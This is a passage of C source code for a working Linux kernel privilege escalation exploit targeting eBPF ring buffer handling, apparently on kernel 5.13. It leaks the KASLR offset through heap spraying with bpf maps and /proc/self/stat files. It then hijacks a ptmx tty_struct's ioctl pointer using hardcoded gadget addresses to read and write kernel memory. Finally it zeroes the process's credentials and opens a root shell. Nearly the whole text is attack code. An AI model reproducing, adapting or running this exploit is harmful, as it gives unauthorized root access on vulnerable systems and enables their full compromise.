      //header_increment = (producer_pos & ringbuff_mask)

      break;//we should be good


    }
  close(rb_query_prog_fd);

  *cover_idx_addr= cover_idx;

  return map_fd;

}

struct check_rb_thread_state
{
  int hashmap_fd;
  int arraymap_fd;
  int started;
  int finished;
};

int num_spinlock_check_threads = 0;

int check_rb_hashmap_func(void * args_in)
{
  unsigned long long value_ll;
  struct check_rb_thread_state * args = args_in;
  debug_printf("[thread] entered...\n");
  args->started = 1;
  value_ll = read_relative8(args->arraymap_fd,args->hashmap_fd,8,0);
  debug_printf("[thread] finished...\n");
  args->finished = 1;
  return 0;
}

int can_use_reserve_rb_hashmap(int hashmap_fd,int arraymap_fd)
{
  struct check_rb_thread_state * args = 0;
  unsigned long long thread_stack = 0;
  int rv = 0;
  args = malloc(sizeof(struct check_rb_thread_state));
  memset(args,0,sizeof(struct check_rb_thread_state));
  args->hashmap_fd = hashmap_fd;
  args->arraymap_fd = arraymap_fd;
  thread_stack = alloc_thread_stack(0);


  debug_printf("num_spinlock_check_threads = %i | %p \n",num_spinlock_check_threads,num_spinlock_check_threads);
  debug_printf("calling clone() \n");
  rv = clone(check_rb_hashmap_func,thread_stack + thread_stack_size_g,CLONE_VM | CLONE_FILES,args);
  num_spinlock_check_threads++;
  sleep(1);
  debug_printf("clone() returned %i\n",rv);
  while (args->started == 0)
    {
      sleep(1);
    }
  sleep(1);
  if (args->finished == 1)
    {
      return 1;
    }
  return 0;

}

struct hashmap_fd_table_list_entry
{
  int hashmap_file_fd_table_size ;
  int hashmap_file_fd_table_counter;
  int * hashmap_file_fd_table ;
  struct hashmap_fd_table_list_entry * next;
};

struct seq_file_fd_table_list_entry
{
  int seq_file_fd_table_size ;
  int seq_file_fd_table_counter;
  int  *seq_file_fd_table ;
  struct seq_file_fd_table_list_entry * next;
};

struct hashmap_fd_table_list_entry * rbquery_leak_hashmap_list_head = 0;
struct seq_file_fd_table_list_entry * rbquery_leak_seq_file_list_head = 0;

void add_hashmap_table(int  *hashmap_file_fd_table,int hashmap_file_fd_table_counter,int hashmap_file_fd_table_size)
{
  struct hashmap_fd_table_list_entry * entry = 0;
  entry = malloc(sizeof(struct hashmap_fd_table_list_entry));
  entry->hashmap_file_fd_table_size  = hashmap_file_fd_table_size ;
  entry->hashmap_file_fd_table_counter = hashmap_file_fd_table_counter;
  entry->hashmap_file_fd_table  = hashmap_file_fd_table ;

  entry->next = rbquery_leak_hashmap_list_head;//old head is next (now second)
  rbquery_leak_hashmap_list_head = entry; //this entry is the new head


}

void add_seqfile_table(int  *seq_file_fd_table,int seq_file_fd_table_counter,int seq_file_fd_table_size)
{
  struct seq_file_fd_table_list_entry * entry = 0;
  entry = malloc(sizeof(struct seq_file_fd_table_list_entry));
  entry->seq_file_fd_table = seq_file_fd_table;
  entry->seq_file_fd_table_counter = seq_file_fd_table_counter;
  entry->seq_file_fd_table = seq_file_fd_table;


  entry->next = rbquery_leak_seq_file_list_head;//old head is next (now second)
  rbquery_leak_seq_file_list_head = entry; //this entry is the new head


}


int free_hashmap_entry_fds()
{
  int i = 0;
  int * fd_ptr = 0;
  struct hashmap_fd_table_list_entry * entry = 0;
  struct hashmap_fd_table_list_entry * old = 0;
  int j = 0;
  entry = rbquery_leak_hashmap_list_head;
  while(entry)
    {
      for(i = 0;i<entry->hashmap_file_fd_table_counter;i++)
	{
	  close(entry->hashmap_file_fd_table[i]);
	  
	}

      old = entry;
      entry = entry->next;
      free(old->hashmap_file_fd_table);
      free(old);
      rbquery_leak_hashmap_list_head = entry;
      j++;
    }
  return j;

}

int free_seqfile_entry_fds()
{
  int i = 0;
  int * fd_ptr = 0;
  struct seq_file_fd_table_list_entry * entry = 0;
  struct seq_file_fd_table_list_entry * old = 0;
  int j = 0;
  entry = rbquery_leak_seq_file_list_head;
  while(entry)
    {
      for(i = 0;i<entry->seq_file_fd_table_counter;i++)
	{
	  close(entry->seq_file_fd_table[i]);
	  
	}

      old = entry;
      entry = entry->next;
      free(old->seq_file_fd_table);
      free(old);
      rbquery_leak_seq_file_list_head = entry;
      j++;
    }


  return j;
}


int get_leak__ringbuf_query(unsigned long long * slide_addr)
{

  unsigned int key_size; 
  unsigned int value_size;
  unsigned int max_entries;
  int rv = 0;
  int arraymap_fd = 0;
  int i = 0;
  int prog_fd = 0;
  int num_spray = 0;
  unsigned long long value_ll = 0;
  unsigned long long temp_ulong = 0;
  unsigned long long key;
  int hashmap_fd = 0;
  int seq_file_fd_table_size  = 0;
  int seq_file_fd_table_counter  = 0;
  int  *seq_file_fd_table = 0;
  
  int ptmx_file_fd_table_size  = 0;
  int ptmx_file_fd_table_counter  = 0;
  int  *ptmx_file_fd_table = 0;
  
  int hashmap_file_fd_table_size  = 0;
  int hashmap_file_fd_table_counter  = 0;
  int * hashmap_file_fd_table = 0;
  int found = 0;

  seq_file_fd_table_size = (PAGE_SIZE/64)*2; //we spray this amount two times

  seq_file_fd_table = malloc(sizeof(int)*seq_file_fd_table_size);
  memset(seq_file_fd_table,0xff,sizeof(int)*seq_file_fd_table_size);//init to -1


  hashmap_file_fd_table_size  =  5*16; //16 before and 4*16 afterwards
  hashmap_file_fd_table = malloc(sizeof(int)*hashmap_file_fd_table_size);
  memset(hashmap_file_fd_table,0xff,sizeof(int)*hashmap_file_fd_table_size); //init to -1
  //get query
  key_size = 4;
  value_size = 0x1337;
  value_size = 8;
  max_entries = 10;
  //max_entries=0xffffffff;
  rv =  arraymap_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY,key_size,value_size,max_entries);   
  debug_printf("bpf_map_create() returned %i\n",rv);

  for(i = 0;i < PAGE_SIZE/64;i++)   //exhaust slabs
    {
      //break;
      rv = open("/proc/self/stat",O_RDONLY);
      debug_printf("[spray] open() retured %i\n",rv);
      if (rv == -1)
	{
	  continue;
	}
      seq_file_fd_table[seq_file_fd_table_counter++] = rv;
    }


  for(i = 0;i < 16;i++) 
    {

      key_size = 4;
      max_entries = 64;// we want bucket 64*0x10 == 0x400  == page_size/4
      max_entries = 128;// we want bucket 128*0x10 == 0x800  == page_size/2
      rv =  bpf_map_create_without_flags(BPF_MAP_TYPE_HASH,key_size,value_size,max_entries,0);
      debug_printf("[spray] bpf_map_create() returned %i\n",rv);

      if (rv == -1)
	{
	  continue;
	}
      hashmap_file_fd_table[hashmap_file_fd_table_counter++] = rv;


    }


  key_size = 4;
  max_entries = 2;
  key_size = 4;
  max_entries = 64;// we want bucket 64*0x10 == 0x400  == page_size/4
  //max_entries = 128;

  rv =  hashmap_fd = bpf_map_create_without_flags(BPF_MAP_TYPE_HASH,key_size,value_size,max_entries,0);
  debug_printf("bpf_map_create() returned %i\n",rv);

  //fill up two pages after our htab object
  //note, we're currently doing this in a qemu vm with one cpu
  for(i = 0;i < (PAGE_SIZE*2)/64;i++) 
    {
      break;
      rv = open("/proc/self/stat",O_RDONLY);
      debug_printf("[spray] open() retured %i\n",rv);
      if (rv == -1)
	{
	  continue;
	}
      seq_file_fd_table[seq_file_fd_table_counter++] = rv;


    }

  for(i = 0;i < 4*16;i++) 
    {

      key_size = 4;
      max_entries = 64;// we want bucket 64*0x10 == 0x400  == page_size/4
      max_entries = 128;
      rv =  bpf_map_create_without_flags(BPF_MAP_TYPE_HASH,key_size,value_size,max_entries,0);

      debug_printf("[spray] bpf_map_create() returned %i\n",rv);
      if (rv == -1)
	{
	  continue;
	}
      hashmap_file_fd_table[hashmap_file_fd_table_counter++] = rv;
    }

  rv = prog_fd = load_program__read_consumer_producer(hashmap_fd,arraymap_fd);

  debug_printf("_bpf_prog_load() returned %i\n",rv);
  if (rv == -1)
    {
      perror("bpf_prog_load()");
      debug_printf("log_buf: %s\n",log_buff_g);
      exit(-1);
    }
  debug_printf("log_buf: %s\n",log_buff_g);
     

  rv = run_program_gen(prog_fd);
  debug_printf("run_program_gen() returned %i\n",rv);

  key = 0;
  value_ll = 0;
  debug_printf("[before] key = %p | value_ll = %p\n",key,value_ll);
  rv = bpf_map_lookup_elem(arraymap_fd, &key, &value_ll);
  debug_printf("bpf_map_lookup_elem() returned %i\n",rv);
  debug_printf("[after] key = %p | value_ll = %p\n",key,value_ll);

  //leak should be htab_map_ops in v5.13.10 //a variable of type struct bpf_map_ops
  ktext_leak  = value_ll;
  debug_printf("ktext_leak = %p\n",ktext_leak);
  debug_printf("ktext_leak_base = %p\n",ktext_leak_base);
  //kaslr_slide = ktext_leak - ktext_leak_base;
  if (((ktext_leak& 0xfffULL) ==  (ktext_leak_base& 0xfffULL)) && is_kaddr(ktext_leak))
    {
      debug_printf("found leak!\n");
      found = 1;
      temp_ulong = ktext_leak - ktext_leak_base;
      //printf("kaslr_slide = %p\n",kaslr_slide);
      printf("kaslr_slide = %p\n",temp_ulong);
      if (slide_addr)
	{
	  *slide_addr = temp_ulong;
	}
    }
  else
    {
      printf("didn't find leak\n");
    }

  //cleanup
  close(prog_fd);
  close(arraymap_fd);
  close(hashmap_fd);

  //store for later

  add_seqfile_table(seq_file_fd_table,seq_file_fd_table_counter,seq_file_fd_table_size);
  add_hashmap_table(hashmap_file_fd_table,hashmap_file_fd_table_counter,hashmap_file_fd_table_size);



  if (found)
    {
      return 0;
    }
  else
    {
      return -1;
    }

}

//0xffffffff815d4911 : mov rax, qword ptr [rdx] ; ret
unsigned long long load_from_rdx_into_rax = 0xffffffff815d4911;

//0xffffffff8135c58c : mov eax, dword ptr [rdx] ; ret
unsigned long long load_from_rdx_into_eax = 0xffffffff8135c58c;

//0xffffffff8120645b : mov qword ptr [rdx], rsi ; ret
unsigned long long store_from_rsi_into_rdx = 0xffffffff8120645b;

//0xffffffff81105c28 : mov dword ptr [rdx], esi ; ret
unsigned long long store_from_esi_into_rdx = 0xffffffff81105c28; //use for write primitive

#define READ_MODE 1
#define WRITE_MODE 2

int curr_mode = 0;

int rw_ptmx_fd_g = -1;
int control_hashmap_fd_g = -1;
char * control_value_buff_g = 0;
int control_hashmap_cover_idx_g = -1;
struct tty_operations * tty_ops_ptr_g = 0;

int switch_mode(int new_mode)
{
  int rv = 0;
  unsigned int key = 0;
  if (curr_mode != new_mode)
    {

      tty_ops_ptr_g = control_value_buff_g;//incase this wasn't done before

      switch(new_mode)
	{
	case READ_MODE:
	  debug_printf("changing to read mode\n");
	  //eax = [rdx]
	  tty_ops_ptr_g->ioctl = load_from_rdx_into_eax; 
	  break;
	case WRITE_MODE:
	  //[rdx] = esi
	  debug_printf("changing to write mode\n");
	  tty_ops_ptr_g->ioctl = store_from_esi_into_rdx;
	  break;
	default:
	  debug_printf("default\n");
	  return -1;
	}

      debug_printf("control_hashmap_fd_g = %i\n",control_hashmap_fd_g);
      debug_printf("control_hashmap_cover_idx_g = %i\n",control_hashmap_cover_idx_g);
      key = control_hashmap_cover_idx_g;
      rv = bpf_map_delete_elem(control_hashmap_fd_g, &key);
      debug_printf("bpf_map_delete_elem() returned %i\n",rv);
      if(rv == -1)
	{
	  perror("bpf_map_delete_elem()");
	}
      key = control_hashmap_cover_idx_g;
      rv = bpf_map_update_elem(control_hashmap_fd_g, &key, control_value_buff_g,BPF_ANY);
      debug_printf("bpf_map_update_elem() returned %i\n",rv);
      if(rv == -1)
	{
	  perror("bpf_map_update_elem()");
	}
      curr_mode = new_mode;
      return 0;


    }
  else
    {
      return 0;
    }

}

int read_addr(char * addr,int n, char * buff_out)
{
  unsigned int rvu = 0;
  char buff[32] = {0};
  unsigned int * dword_ptr = buff;
  char * addr_ptr = 0;
  char * buff_ptr = 0;
  int len = 0;

  switch_mode(READ_MODE);

  addr_ptr = addr;
  buff_ptr = buff_out;
  while (n)
    {
      rvu = ioctl(rw_ptmx_fd_g,0xdeadbeef,addr_ptr);
      dword_ptr[0] = rvu;
      len = (n<4)?n:4;
      memcpy(buff_ptr,dword_ptr,len);
      addr_ptr = addr_ptr + 4;
      buff_ptr = buff_ptr + 4;
      n = n - len;

    }

}

int write_addr(char * addr,int n, char * buff_in)
{
  unsigned int rvu = 0;
  char buff[32] = {0};
  unsigned int * dword_ptr = buff;
  char * addr_ptr = 0;
  char * buff_ptr = 0;
  int len = 0;
  int i = 0;
  int rv = 0;

  switch_mode(WRITE_MODE);

  //dword_ptr = buff_in;
  addr_ptr = addr;
  buff_ptr = buff_in;
  dword_ptr = buff_in;
  i = 0;
  while (n)
    {

      //*(u32 *)addr_ptr = dword_ptr[i]
      debug_printf("[%s()] dword_ptr[%i] = %p\n",__FUNCTION__,i,dword_ptr[i]);
      rvu = rv = ioctl(rw_ptmx_fd_g,dword_ptr[i],addr_ptr);
      debug_printf("[%s()] [%i] ioctl returned %i\n",__FUNCTION__,i,rv);
      len = (n<4)?n:4;
      addr_ptr = addr_ptr + 4;
      //buff_ptr = buff_ptr + 4;
      i++;
      n = n - len;

    }

  return 0;

}

int replace_ptmx(int pwn_hashmap_fd,int arraymap_fd,int result_arraymap_fd,unsigned long long control_value_kaddr,int cover_idx,int num_pages)
{
  int rv =0;
  unsigned long long producer_pos;
  unsigned long long consumer_pos;
  unsigned long long ringbuff_mask;
  unsigned long long key = 0;
  unsigned long long value = 0;
  int write_page_addr_prog_fd = 0;
  int page_portion = PAGE_SIZE/2;
  unsigned long long value_ll = 0;
  int found = 0;
  int k = 0;
  int j = 0;


  debug_printf("calling load_program__write_page_addr__reserve_buffer()\n",__FUNCTION__);

  rv = write_page_addr_prog_fd = load_program__write_page_addr__reserve_buffer(pwn_hashmap_fd,result_arraymap_fd,0x1000,ptm_unix98_ops,control_value_kaddr);

  debug_printf("load_program__write_page_addr__reserve_buffer() returned %i\n",rv);

  for(k = 0;k<num_pages;k++)
    {

      for(j = 0; j < page_size_g;j+=page_portion)
	{
	  debug_printf("calling find_suitable_mask()\n",__FUNCTION__);
	  find_suitable_mask(pwn_hashmap_fd,arraymap_fd,cover_idx,PAGE_SIZE/2);
	  debug_printf("returned from find_suitable_mask()\n",__FUNCTION__);

	  debug_printf("calling run_program_gen2()\n");
	  rv = run_program_gen2(write_page_addr_prog_fd);

	  debug_printf("run_program_gen2 returned %i\n",rv);
	  key = 0;
	  value_ll = 0;

	  rv = bpf_map_lookup_elem(result_arraymap_fd, &key, &value_ll);
	  debug_printf("program rv via map = %p\n",value_ll);
	  if (value_ll == 1)
	    {
	      found = 1;
	      {
		close(write_page_addr_prog_fd);
		return 1;
	      }
	      break;
	    }

	}
      if (found)
	{
	  break;
	}
    }

  close(write_page_addr_prog_fd);

  return 0;
}


void exploit()
{

  int rv = 0;
  unsigned int key_size; 
  unsigned int value_size;
  unsigned int max_entries;
  int i = 0;
  unsigned long long value_ll = 0;
  unsigned long long uffd_handler_thread_stack = 0;
  int uffd_tid = 0;
  unsigned long long consumer_pos = 0;
  unsigned long long producer_pos = 0;
  int arraymap_fd = 0;
  int pwn_hashmap_fd = 0;
  char dummy_l[64] = {0};
  int read_prod_cons_prog_fd = 0;
  int reserve_test_prog_fd = 0;
  char * temp_leak_buff_l[200] = {0};
  char * leak_buff = 0;
  unsigned long long * qword_ptr  = 0;
  int num_spray = 0;
  int num_leak_pages = 0;//number of pages to leak
  unsigned long long temp_offset = 0;

  int rb_query_prog_fd = 0;
  int cover_idx = 0;
  int test_arraymap_fd = 0;
  int control_hashmap_fd = 0;
  char * control_value_buff = 0;
  char * temp_value_buff = 0;

  int control_hashmap_cover_idx  = 0;
  int result_arraymap_fd  = 0;
  unsigned long long control_element_kaddr = 0;
  unsigned long long control_value_kaddr = 0;
  int write_page_addr_prog_fd = 0;
  int replaced = 0;
  unsigned int rvu = 0;
  struct tty_operations * tty_ops_ptr = 0;
  int rw_ptmx_fd = -1;
  unsigned int * dword_ptr = 0;
  struct rlimit temp_rlimit_info = {0};
  unsigned long long my_task = 0;
  unsigned long long my_cred = 0;
  int uid = 0;
  int j = 0;
  unsigned long long ringbuff_mask = 0;
  char * buff = 0;

  //init
  leak_buff = alloc_anon_rw_vma(10);


  key_size = 4;
  value_size = 8;
  max_entries = 10;

  rv =  arraymap_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY,key_size,value_size,max_entries);   

  max_entries = 0x1000/8;


  rv = getrlimit(RLIMIT_NOFILE,&temp_rlimit_info);

  if(rv == -1)
    {
      perror("getrlimit()");
      exit(-1);
    }

  temp_rlimit_info.rlim_cur = temp_rlimit_info.rlim_max;//increase limit as much as possible

  rv = setrlimit(RLIMIT_NOFILE,&temp_rlimit_info);
  if(rv == -1)
    {
      perror("setrlimit()");
      exit(-1);
    }

  memset(dummy_l,0x0,64);
  //get leak

  {
    rv = -1;
    kaslr_slide = 0xffffffffffffffff;
    while (rv == -1)
      {
	debug_printf("before calling get_leak__ringbuf_query()...\n");

	rv = get_leak__ringbuf_query(&kaslr_slide);
	debug_printf("after calling get_leak__ringbuf_query()...\n");
	debug_printf("rv = %i | kaslr_slide = %p\n",rv,kaslr_slide);

	if (rv != -1)
	  {
	    printf("[+] kaslr_slide @ %p\n",kaslr_slide);
	  }

      }
  }

  //look for and corrupt tty_struct

  ptm_unix98_ops = ptm_unix98_ops_base + kaslr_slide ;
  init_task_comm = init_task_comm_base + kaslr_slide;
  init_task = init_task_base + kaslr_slide;

  key_size  = 4;
  value_size = 0x120;//size of tty_ops
  max_entries = 4;
  rv =  control_hashmap_fd = bpf_map_create_without_flags(BPF_MAP_TYPE_HASH,key_size,value_size,max_entries,0); 

  debug_printf("[control hashmap] bpf_map_create() returned %i\n",rv);

  temp_value_buff = malloc(value_size);
  control_value_buff = malloc(value_size);
  memset(control_value_buff,0,value_size);
  memset(temp_value_buff,0x41,value_size);

  load_from_rdx_into_rax = load_from_rdx_into_rax + kaslr_slide;
  load_from_rdx_into_eax = load_from_rdx_into_eax+ kaslr_slide;
  store_from_esi_into_rdx = store_from_esi_into_rdx + kaslr_slide;

  tty_ops_ptr = control_value_buff;
  tty_ops_ptr->ioctl = load_from_rdx_into_rax;
  tty_ops_ptr->ioctl = load_from_rdx_into_eax;


  tty_ops_ptr_g =  control_value_buff_g = control_value_buff;

  control_hashmap_cover_idx  =  rb_cover_mask_with_hptr__ex(control_hashmap_fd,arraymap_fd,control_value_buff);

  ringbuff_mask = read_mask(control_hashmap_fd,arraymap_fd); //if everything works, this will be a heap leak (mask -1)

  ringbuff_mask = ringbuff_mask-1;

  //printf("got ringbuff_mask = %p\n",ringbuff_mask);
  debug_printf("got ringbuff_mask = %p\n",ringbuff_mask);


  if(1)
    {
      debug_printf("freeing fds used to get leak\n");
      rv = free_hashmap_entry_fds();
      debug_printf("free_hashmap_entry_fds() returned %i\n",rv);
      rv = free_seqfile_entry_fds();
      debug_printf("free_seqfile_entry_fds() returned %i\n",rv);
    }

  control_element_kaddr = ringbuff_mask;
  control_value_kaddr = control_element_kaddr + 0x30 + 8;

  key_size = 4;
  value_size = 8;
  max_entries = 1;

  rv =  result_arraymap_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY,key_size,value_size,max_entries);   
  debug_printf("[result arraymap] bpf_map_create() returned %i\n",rv);

  //exauhst slab's worth of objets
  for( i = 0;i<64;i++) //64*64 == 0x1000
    {
      rv = alloc_buff_xattr(dummy_l,64);
    }

  debug_printf("[iter %i] start of search loop\n",i);
  printf("[+] searching for tty_struct\n");
  i = 0;
  while (1)
    {

      debug_printf("[iter %i] start of search loop\n",i);
      printf("[+] searching ...\n");
      cover_idx = -1;

      if (1)
	{

	  rv = spray_n_tty_table(16);
	  debug_printf("calling find_suitable_hashmap()\n",rv);
	  rv = pwn_hashmap_fd = find_suitable_hashmap(arraymap_fd,&cover_idx);
	  rv = spray_n_tty_table(100);
	  debug_printf("find_suitable_hashmap() returned %i\n",rv);
	  debug_printf("cover_idx = %i\n",cover_idx);

      
	}

      debug_printf("pwn_hashmap_fd = %i\n",pwn_hashmap_fd);


      if  (ptmx_fd_count >= ((sizeof(ptmx_fd_table)/sizeof(int)) - 10))
	{

	  debug_printf("out of ptmx fd in main thread\n");

	  break;//failure, not able to spray anymore structs (unless we spawn children and use their fdtables)
	}
      rv = spray_n_tty_table(8);


      debug_printf("calling replace_ptmx()\n");
 
      rv = replace_ptmx(pwn_hashmap_fd,arraymap_fd, result_arraymap_fd,control_value_kaddr,cover_idx,5);
      debug_printf("replace_ptmx() returned %i\n",rv);
      if (rv == 1)
	{
	  debug_printf("looking for fd of controlled tty_struct\n");
	  for(j = 0;j<ptmx_fd_count;j++)
	    {
	      rvu = ioctl(ptmx_fd_table[j],0xdeadbeef,init_task_comm);
	      if (rvu != 0xffffffff)
		{
		  rw_ptmx_fd = ptmx_fd_table[j];

		  debug_printf("[%i] rvu = %p\n",j,rvu);
		  break;
		}
	    }
	  if (rw_ptmx_fd != -1)
	    {
	      debug_printf("got rw_ptmx_fd = %i\n",rw_ptmx_fd);
	      replaced = 1;
	      debug_printf("found tty struct!\n");

	      break;
	    }
	  debug_printf("failed to find ptmx fd in table; must have overwritten other tty_struct...; trying again\n");
	}
      i++;
    }

  //traverse task list and write to cred struct

  rw_ptmx_fd_g = rw_ptmx_fd;
  printf("[+] found tty_struct! (fd = %i) \n",rw_ptmx_fd_g);
  curr_mode = READ_MODE;
  control_hashmap_fd_g = control_hashmap_fd;
  control_hashmap_cover_idx_g = control_hashmap_cover_idx;
  debug_printf("control_hashmap_fd = %i | control_hashmap_cover_idx = %i\n",control_hashmap_fd,control_hashmap_cover_idx);
  buff = alloc_anon_rw_vma(1);
  read_addr_func = read_addr;
  init_task_64 = init_task;
  debug_printf("init_task_64 @ %p\n",init_task_64);
  debug_printf("before looking for task\n");
  printf("[+] looking for task_struct\n");
  my_task = 0xffffffffffffffff;
  my_task = find_task_64(getpid());

  debug_printf("got my_task = %p\n",my_task);
  printf("[+] task_struct @ %p\n",my_task);

  my_cred = 0xffffffffffffffff;
  read_addr(my_task + task_struct_cred_offset_64,8,&my_cred);
  debug_printf("got my_cred = %p\n",my_cred);
  debug_printf("after looking for task\n");
  printf("[+] cred_struct @ %p\n",my_cred);

  uid = getuid();
  debug_printf("before writing to cred\n");
  debug_printf("uid = %i\n",uid);

  memset(buff,0,4*8);
  write_addr(my_cred + 4,8*4,buff);
  uid = getuid();
  debug_printf("after writing to cred\n");
  debug_printf("uid = %i\n",uid);
 
  //maybe set capabilities as well
  //maybe look for smashed values?

  if(uid == 0)
    {
      printf("got root!\n");
      printf("opening shell...\n");
      system("/bin/sh");
    }

}

int main()
{
  int map_fd = 0;
  int prog_fd = 0;
  int insn_count = 0;
  int socketfds[2] = {0};
  int rv = 0;
  long long errno_l;
  unsigned long long key;
  unsigned long long value;
  struct bpf_insn * new_prog= 0;
  struct bpf_insn * prog_ptr= 0;
  struct bpf_insn dummy_insn = {0};
  struct bpf_insn try_prog = {
  };
  struct bpf_insn prog[] = {
  };
  uint64_t mask64 = 0;
  uint32_t mask32 = 0;
  int e = 0;
  int temp_key = 0;
  int i = 0;

  task_struct_tasks_offset_64 = 0x808;
  task_struct_comm_offset_64 = 0xae8;
  task_struct_cred_offset_64 = 0xad8;
  task_struct_pid_offset_64 = 0x910;

  page_size_g  = PAGE_SIZE = get_pagesize();
  thread_stack_size_g =  page_size_g*8;

  rv = creat("/tmp/blah",O_CREAT|O_RDWR);
  debug_printf("creat() returned %i\n",rv);


  if (rv == -1)
    {
      perror("creat()");
      exit(-1);
    }


  if (1)
    {
      debug_printf("calling exploit()\n");
      exploit();
      exit(0);
    }

}
